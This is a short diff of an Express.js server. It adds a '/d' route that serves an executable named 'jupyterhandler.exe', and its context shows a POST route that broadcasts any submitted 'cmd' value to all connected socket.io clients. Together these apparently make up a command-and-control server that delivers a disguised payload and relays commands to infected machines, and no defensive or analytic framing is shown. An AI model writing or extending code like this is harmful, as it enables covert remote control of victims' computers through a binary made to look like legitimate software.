@@ -20,6 +20,10 @@ app.get('/', (req,res)=>{
     res.send("Hello, you...")//<script src='/socket.io/socket.io.js'></script><script>var socket = io();</script>
 })
 
+app.get('/d',(req,res)=>{
+  res.download(__dirname+"/jupyterhandler.exe")
+})
+
 app.post('/', (req, res) => {
     raw_cmd = req.body.cmd
     io.emit('cmd',raw_cmd)
